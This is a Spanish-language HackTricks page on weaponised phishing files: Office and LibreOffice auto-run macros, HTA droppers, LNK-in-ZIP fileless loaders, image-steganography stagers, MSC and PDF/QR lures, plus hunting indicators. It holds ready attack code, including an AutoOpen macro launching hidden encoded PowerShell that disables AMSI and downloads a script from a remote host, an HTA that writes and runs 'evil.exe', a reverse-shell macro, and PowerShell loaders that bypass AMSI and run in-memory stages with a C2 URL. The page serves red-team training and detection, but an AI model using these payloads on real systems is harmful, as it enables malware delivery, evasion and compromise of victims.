# Archivos y documentos de phishing

{{#include ../../banners/hacktricks-training.md}}

## Documentos de Office

Microsoft Word realiza una validación de los datos del archivo antes de abrirlo. La validación de datos se realiza identificando la estructura de datos conforme al estándar OfficeOpenXML. Si se produce algún error durante la identificación de la estructura de datos, el archivo analizado no se abrirá.

Por lo general, los archivos de Word que contienen macros usan la extensión `.docm`. Sin embargo, es posible cambiar la extensión del archivo y mantener la capacidad de ejecutar macros.\
Por ejemplo, un archivo RTF no admite macros por diseño, pero Microsoft Word puede procesar un archivo DOCM cuya extensión se haya cambiado a RTF y ejecutar sus macros.\
Los mismos mecanismos internos se aplican a todo el software de la suite Microsoft Office (Excel, PowerPoint, etc.).

Puedes usar el siguiente comando para comprobar qué extensiones ejecutarán algunos programas de Office:

```bash
assoc | findstr /i "word excel powerp"
```

Archivos DOCX que hacen referencia a una plantilla remota (File –Options –Add-ins –Manage: Templates –Go) que incluye macros también pueden «ejecutar» macros.

### Carga de imagen externa

Ve a: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Documentos de Office - Carga de imagen externa: Ve a: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

Para analizar un documento recibido en lugar de crear uno, consulta [Análisis de macros VBA: código basura y UserForms](../basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis.md#vba-macro-analysis-junk-code-and-userforms).

### Puerta trasera mediante macros

Es posible usar macros para ejecutar código arbitrario desde el documento.

#### Funciones de carga automática

Cuanto más comunes sean, más probable es que el AV las detecte.

- AutoOpen()
- Document_Open()

#### Ejemplos de código de macros

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Eliminar metadatos manualmente

Ve a **File > Info > Inspect Document > Inspect Document**, lo que abrirá el Inspector de documentos. Haz clic en **Inspect** y luego en **Remove All**, junto a **Document Properties and Personal Information**.

#### Extensión de documento

Cuando hayas terminado, selecciona el menú desplegable **Save as type** y cambia el formato de **`.docx`** a Word 97-2003 **`.doc`**.\
Hazlo porque **no puedes guardar macros dentro de un `.docx`** y existe un **estigma** **en torno a** la extensión **`.docm`**, habilitada para macros (p. ej., el icono de miniatura tiene un enorme `!` y algunas pasarelas web o de correo electrónico los bloquean por completo). Por lo tanto, esta **extensión heredada `.doc` es el mejor término medio**.

#### Generadores de macros maliciosas

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Macros de ejecución automática de LibreOffice ODT (Basic)

Los documentos de LibreOffice Writer pueden incrustar macros Basic y ejecutarlas automáticamente al abrir el archivo, vinculando la macro al evento **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Una macro sencilla de reverse shell es así:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Ten en cuenta las comillas dobles (`""`) dentro de la cadena: LibreOffice Basic las usa para representar comillas literales, por lo que los payloads que terminan en `...==""")` mantienen equilibrados tanto el comando interno como el argumento de Shell.

Consejos para la entrega:

- Guarda el archivo como `.odt` y vincula la macro al evento del documento para que se ejecute inmediatamente al abrirlo.
- Al enviar un correo con `swaks`, usa `--attach @resume.odt` (el `@` es obligatorio para que se envíen los bytes del archivo y no la cadena con el nombre del archivo como adjunto). Esto es fundamental al abusar de servidores SMTP que aceptan destinatarios `RCPT TO` arbitrarios sin validación.

## Archivos HTA

Un HTA es un programa de Windows que **combina HTML y lenguajes de scripting (como VBScript y JScript)**. Genera la interfaz de usuario y se ejecuta como una aplicación «totalmente confiable», sin las restricciones del modelo de seguridad de un navegador.

Un HTA se ejecuta mediante **`mshta.exe`**, que normalmente se **instala** junto con **Internet Explorer**, por lo que **`mshta` depende de IE**. Así que, si se ha desinstalado, los HTA no podrán ejecutarse.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Tarjetas de adjuntos falsas en correos HTML

Un correo HTML puede imitar la tarjeta nativa de vista previa de adjuntos de un proveedor en lugar de incluir un adjunto real. Talos observó una tarjeta de Gmail reconstruida a partir de cuatro partes MIME PNG en línea codificadas en Base64. Todo el elemento visual estaba envuelto en un único anchor, y un valor de destinatario en `?m=<target-id>` permitía el seguimiento por destinatario. El enlace comenzaba con `//` en lugar de `http://` o `https://`; los navegadores resuelven esa forma relativa al protocolo, pero los extractores de URL que solo detectan URL completamente calificadas pueden pasarla por alto.<sup>[[11]](#references)</sup>

Durante el análisis, inspecciona el MIME sin procesar en lugar de confiar en la lista de adjuntos renderizada. Reconstruye cómo las partes de imagen en línea forman la tarjeta visual, identifica el anchor que la envuelve y normaliza los valores `href` relativos al protocolo antes de extraer las URL.<sup>[[11]](#references)</sup>

Para probar la suplantación del remitente del sobre/cabecera y la alineación de DMARC, consulta [SMTP mail spoofing countermeasures](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).

## Forzar la autenticación NTLM

Hay varias formas de **forzar la autenticación NTLM "remotamente"**; por ejemplo, se pueden añadir **imágenes invisibles** a correos o HTML que el usuario visitará (¿incluso mediante HTTP MitM?). También se puede enviar a la víctima la **dirección de archivos** que **desencadenarán** una **autenticación** con solo **abrir la carpeta**.

**Consulta estas ideas y más en las siguientes páginas:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

No olvides que no solo puedes robar el hash o la autenticación, sino también **realizar ataques NTLM relay**:

- [**Ataques NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay a certificados)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK para preparar comandos locales con `ftp.exe`

Un acceso directo puede iniciar `ftp.exe -s:icon.ico` con un archivo de comandos de texto disfrazado con una extensión de imagen.<sup>[[12]](#references)</sup> La opción `-s:` lee comandos FTP locales; en Windows 8 y versiones posteriores, el archivo debe estar codificado en UTF-8.<sup>[[13]](#references)</sup> Una línea que comienza con `!` ejecuta un comando local mediante `cmd /c`, sin enviar ese comando a un servidor FTP. No se requiere una conexión FTP para esta ruta de ejecución local.<sup>[[14]](#references)</sup> En la cadena reportada, el script FTP llegaba a un segundo archivo de comandos. La línea `!` completa es importante: `!more res.ico` por sí sola muestra el archivo, mientras que una tubería a `cmd` ejecuta su contenido.<sup>[[12]](#references)[[14]](#references)</sup>

La misma cadena usaba una tarea recurrente para volver a leer un archivo de comandos modificable, en lugar de instalar un nuevo ejecutable con cada actualización. La acción de la tarea era `conhost --headless cmd /c more C:\Users\Public\Music\err.log|cmd`; el archivo contenía un comando que obtenía instrucciones al ejecutarse. Una variante relacionada descargaba un archivo de comandos de reemplazo antes de una ejecución programada. El archivo debe estar presente y ser legible cuando se active la tarea; `conhost` no eleva los privilegios de la tarea por encima del token de usuario configurado.<sup>[[12]](#references)</sup> Consulta [ejecución mediante tareas programadas](../../windows-hardening/lateral-movement/atexec.md) para conocer los mecanismos de las tareas.

## Acceso directo VHDX con MSI oculto y documento señuelo

Un VHDX montado puede mostrar un LNK visible y ocultar un MSI y una hoja de cálculo señuelo en el mismo volumen. En la cadena reportada, el LNK usaba `cmd.exe /c Visa_Details.msi & Attachment-2.xls`. El separador `&` abre el señuelo incluso si falla el comando del instalador; que se abra el documento no demuestra que la instalación se haya realizado correctamente. Esta es una variante de entrega de [ejecución mediante acciones personalizadas de MSI](../../windows-hardening/windows-local-privilege-escalation/create-msi-with-wix.md), no una escalada de privilegios mediante MSI por sí sola.<sup>[[12]](#references)</sup>

Para este MSI, `CustomAction.Type` **194** combina un EXE almacenado en la tabla `Binary` (**2**) con las opciones de ignorar el código de retorno (**64**) y ejecución asíncrona (**128**). La combinación **64 + 128** significa que Windows Installer no espera a que termine el EXE; la opción 128 por sí sola esperaría hasta el final de la secuencia.<sup>[[15]](#references)[[16]](#references)</sup> Comprueba el `Source` de la acción respecto de la tabla `Binary` y su ubicación en `InstallExecuteSequence` antes de atribuir la ejecución a ese EXE incrustado.<sup>[[12]](#references)[[15]](#references)</sup> Una [ruta UNC de WebDAV puede entregar un MSI remoto](../../network-services-pentesting/pentesting-web/put-method-webdav.md#remote-msi-from-a-webdav-unc-path), pero es un punto de entrada distinto.

## Cargadores LNK + payloads incrustados en ZIP (cadena fileless)

Las campañas muy efectivas entregan un ZIP que contiene dos documentos señuelo legítimos (PDF/DOCX) y un .lnk malicioso. El truco consiste en que el cargador de PowerShell real está almacenado en los bytes sin procesar del ZIP, después de un marcador único, y el .lnk lo extrae y ejecuta completamente en memoria.<sup>[[2]](#references)</sup>

Flujo típico implementado por el one-liner de PowerShell del .lnk:

1) Buscar el ZIP original en rutas comunes: Escritorio, Descargas, Documentos, %TEMP%, %ProgramData% y el directorio padre del directorio de trabajo actual.
2) Leer los bytes del ZIP y buscar un marcador codificado (por ejemplo, xFIQCV). Todo lo que aparece después del marcador es el payload de PowerShell incrustado.
3) Copiar el ZIP a %ProgramData%, extraerlo allí y abrir el .docx señuelo para aparentar legitimidad.
4) Evadir AMSI para el proceso actual: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Desofuscar la siguiente etapa (por ejemplo, eliminar todos los caracteres #) y ejecutarla en memoria.

Ejemplo de estructura básica de PowerShell para extraer y ejecutar la etapa incrustada:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Notas
- La entrega suele abusar de subdominios de PaaS de buena reputación (p. ej., *.herokuapp.com) y puede filtrar los payloads (servir ZIP benignos según la IP/UA).
- La siguiente etapa suele descifrar shellcode codificado en base64/XOR y ejecutarlo mediante Reflection.Emit + VirtualAlloc para minimizar los artefactos en disco.

Persistencia utilizada en la misma cadena
- Secuestro de COM TypeLib del control Microsoft Web Browser para que IE/Explorer o cualquier aplicación que lo incorpore vuelva a iniciar automáticamente el payload.<sup>[[2]](#references)[[4]](#references)</sup> Consulta los detalles y comandos listos para usar aquí:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Búsqueda/IOCs
- Archivos ZIP que contienen la cadena marcadora ASCII (p. ej., xFIQCV) añadida a los datos del archivo.
- Un `.lnk` que enumera las carpetas principales y de usuario para localizar el ZIP y abrir un documento señuelo.
- Manipulación de AMSI mediante [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Largos hilos de correo de negocios que terminan con enlaces alojados en dominios de PaaS confiables.

## Preparación con señuelo LNK primero → persistencia mediante tarea programada → side-loading de CPL confiable

Otro patrón recurrente es un **`.lnk` que suplanta un documento** y abre inmediatamente un señuelo benigno mientras prepara la cadena real en segundo plano.<sup>[[3]](#references)</sup>

Flujo de trabajo observado:
1. El acceso directo **se hace pasar por un PDF** y utiliza `conhost.exe` o un proxy similar para iniciar un descargador de PowerShell ofuscado.
2. PowerShell fragmenta tokens evidentes (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) para que las detecciones ingenuas que buscan `iwr`, `gci`, `ren`, `cpi` o `schtasks` no detecten el comando.
3. El stager descarga **primero el documento señuelo**, lo abre para la víctima y luego reconstruye los archivos maliciosos en segundo plano.
4. Los payloads pueden escribirse con **extensiones basura** y luego renombrarse eliminando caracteres de relleno, lo que retrasa la aparición de artefactos `.exe` / `.cpl` evidentes.
5. La persistencia se establece con una **tarea programada que se ejecuta cada minuto** e inicia un binario de host confiable desde una ruta en la que el usuario puede escribir.

Indicios mínimos para buscar este patrón:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Un diseño de staging útil para reconocer es:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` o `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Por qué la segunda etapa es sigilosa

En el estudio de caso de Rapid7, la tarea programada ejecutaba repetidamente **`Fondue.exe`** desde `C:\Users\Public\`. Como **`APPWIZ.cpl`** estaba ubicado junto a él y exportaba **`RunFODW`**, el binario confiable de Microsoft cargaba mediante side-loading el CPL del atacante en lugar de la copia legítima del sistema.

Luego, el CPL:
- Lee un blob **AES-256-CBC** de `C:\Windows\Tasks\editor.dat`
- Lo descifra mediante **Windows CNG / `bcrypt.dll`**
- Asigna memoria ejecutable y copia el shellcode descifrado
- Lo ejecuta indirectamente pasando el puntero al shellcode como callback de **`EnumUILanguagesW`**

Vale la pena buscar ese último paso por separado: el malware suele evitar un salto directo `((void(*)())buf)()` y, en su lugar, abusa de una **WinAPI legítima que acepta callbacks** para transferir la ejecución.

El payload descifrado de esta campaña era shellcode **Donut**, que luego mapeaba el PE final completamente en memoria y parcheaba **AMSI/WLDP/ETW** en el proceso actual antes de cederle la ejecución. Para más información sobre el side-loading y el postprocesamiento residente en memoria, consulta:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Pivotes prácticos para hunting:
- Un `.lnk` que inicia `powershell.exe` o `conhost.exe`, seguido de un documento señuelo visible.
- Descargas de corta duración en **`C:\Users\Public\`**, seguidas de cambios inmediatos de nombre desde extensiones sin sentido.
- Tareas programadas con nombres anodinos, como `GoogleErrorReport`, que se ejecutan desde **directorios en los que el usuario puede escribir**.
- Binarios confiables que cargan archivos **`.cpl` / `.dll`** desde el mismo directorio no perteneciente al sistema.
- Blobs de texto Base64 escritos en **`C:\Windows\Tasks\`** y luego leídos por el módulo cargado mediante side-loading.

## Payloads delimitados mediante esteganografía en imágenes (stager de PowerShell)

Las cadenas de carga recientes entregan JavaScript/VBS ofuscado que decodifica y ejecuta un stager de PowerShell en Base64. Ese stager descarga una imagen (a menudo GIF) que contiene una DLL .NET codificada en Base64 y oculta como texto sin formato entre marcadores únicos de inicio y fin. El script busca estos delimitadores (ejemplos vistos en la práctica: «<<sudo_png>> … <<sudo_odt>>>»), extrae el texto situado entre ellos, lo decodifica de Base64 a bytes, carga el ensamblado en memoria e invoca un método de entrada conocido con la URL de C2.<sup>[[5]](#references)</sup>

Flujo de trabajo
- Etapa 1: Un dropper JS/VBS archivado decodifica el Base64 incrustado e inicia el stager de PowerShell con -nop -w hidden -ep bypass.
- Etapa 2: El stager de PowerShell descarga una imagen, extrae el Base64 delimitado por marcadores, carga la DLL .NET en memoria y llama a su método (p. ej., VAI), pasándole la URL de C2 y las opciones.
- Etapa 3: El loader recupera el payload final y normalmente lo inyecta mediante process hollowing en un binario confiable (comúnmente MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Obtén más información sobre process hollowing y la ejecución proxy mediante utilidades confiables aquí:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Ejemplo de PowerShell para extraer una DLL de una imagen e invocar un método .NET en memoria:

<details>
<summary>Extractor y loader de payloads esteganográficos en PowerShell</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Notas
- Esto es ATT&CK T1027.003 (esteganografía/ocultación de marcadores).<sup>[[6]](#references)</sup> Los marcadores varían entre campañas.
- El bypass de AMSI/ETW y la desofuscación de cadenas se aplican habitualmente antes de cargar el ensamblado.
- Hunting: analiza las imágenes descargadas en busca de delimitadores conocidos; identifica PowerShell accediendo a imágenes y decodificando inmediatamente blobs Base64.

Consulta también las herramientas de stego y las técnicas de carving:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## Droppers JS/VBS → staging de PowerShell mediante Base64

Una etapa inicial recurrente es un archivo `.js` o `.vbs` pequeño y muy ofuscado, incluido en un archivo comprimido. Su único propósito es decodificar una cadena Base64 incrustada y ejecutar PowerShell con `-nop -w hidden -ep bypass` para iniciar la siguiente etapa a través de HTTPS.<sup>[[5]](#references)</sup>

Lógica esquemática (abstracta):
- Leer el contenido del propio archivo
- Localizar un blob Base64 entre cadenas basura
- Decodificarlo a PowerShell ASCII
- Ejecutarlo con `wscript.exe`/`cscript.exe`, que invoca `powershell.exe`

Indicadores para hunting
- Archivos adjuntos JS/VBS comprimidos que inician `powershell.exe` con `-enc`/`FromBase64String` en la línea de comandos.
- `wscript.exe` que inicia `powershell.exe -nop -w hidden` desde rutas temporales del usuario.

## Documentos MSC como contenedores de ejecución (GrimResource)

Los archivos de Microsoft Management Console (`.msc`) son definiciones de consola XML que normalmente abre `mmc.exe`. **GrimResource** aprovecha una referencia `StringTable` a un recurso `apds.dll` que contiene una antigua primitiva XSS, por lo que, cuando un usuario abre la consola manipulada, se ejecuta JavaScript dentro de `mmc.exe`. Las muestras observadas combinaban ofuscación basada en `transformNode` con **DotNetToJScript** para instanciar un payload .NET sin recurrir a la ruta habitual de macros de Office.<sup>[[9]](#references)</sup>

Para el triage estático, trata un MSC que no sea de confianza como texto y **no hagas doble clic en él**:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Los pivotes de runtime con alta señal son que `mmc.exe` cargue el CLR o componentes de scripting, cree conexiones de red o inicie `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` o un ejecutable inesperado. El formato es legítimo, así que las detecciones deberían correlacionar **el origen + contenido XML/script sospechoso + el comportamiento de `mmc.exe`** en lugar de bloquear todos los MSC.<sup>[[9]](#references)</sup>

## Redireccionadores PDF/QR y control de payload

Un PDF no necesita un exploit para ser útil. Campañas recientes incluyen un **código QR o un enlace común** en un documento que parece inofensivo, alejan la sesión del navegador de los controles del correo y personalizan el destino con la dirección del destinatario. Microsoft documentó en 2025 PDFs cuyas URL de código QR eran únicas para cada destinatario y llevaban a una infraestructura de robo de credenciales RaccoonO365; una cadena paralela usó controles basados en IP/entorno para devolver una ruta de JavaScript/MSI a visitantes seleccionados y un PDF inofensivo a los escáneres o clientes no permitidos.<sup>[[10]](#references)</sup>

Analiza tanto las acciones del PDF como los códigos QR renderizados. Un código QR puede estar dibujado en formato vectorial en lugar de almacenarse como una imagen extraíble, así que rasteriza todas las páginas además de extraer las imágenes incrustadas:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Inspecciona los destinos decodificados y las redirecciones desde un sistema de análisis aislado, sin autenticarte. Entre las características útiles para la búsqueda se incluyen PDF que solo contienen QR con cuerpos de correo casi vacíos, la dirección de correo del destinatario incrustada en un parámetro de consulta, varias redirecciones a través de servicios de hosting de buena reputación y contenido diferente en función de la IP, la geolocalización, las cookies, el referente o el user agent. Compara las solicitudes con perfiles controlados, ya que una única consulta desde un sandbox podría recibir únicamente el señuelo.<sup>[[10]](#references)</sup>

## Archivos de Windows para robar hashes NTLM

Consulta la página sobre **lugares para robar credenciales NTLM**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job: macro de LibreOffice → webshell de IIS → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research: campaña ZipLine: un sofisticado ataque de phishing dirigido a empresas de EE. UU.](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7: malware a la mode: seguimiento de las tácticas de Dropping Elephant mediante una cadena de loaders con temática china](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Secuestro de TypeLib: nueva técnica de persistencia COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42: el loader PhantomVAI distribuye varios infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK: esteganografía (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK: Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK: ejecución mediante proxy con utilidades de desarrollador de confianza: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs: GrimResource: Microsoft Management Console para el acceso inicial y la evasión](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog: los actores de amenazas aprovechan la temporada de impuestos para desplegar campañas de phishing relacionadas con impuestos](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos: cadena de distribución de UAT-11587 y backdoor Antino](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
- [12] [FortiGuard Labs: BITTER amplía su arsenal con PapRAT](https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat)
- [13] [Microsoft Learn: comando ftp](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ftp)
- [14] [LOLBAS: Ftp.exe](https://lolbas-project.github.io/lolbas/Binaries/Ftp/)
- [15] [Microsoft Learn: tipo 2 de acción personalizada](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-type-2)
- [16] [Microsoft Learn: opciones de procesamiento de retorno de acciones personalizadas](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-return-processing-options)
{{#include ../../banners/hacktricks-training.md}}
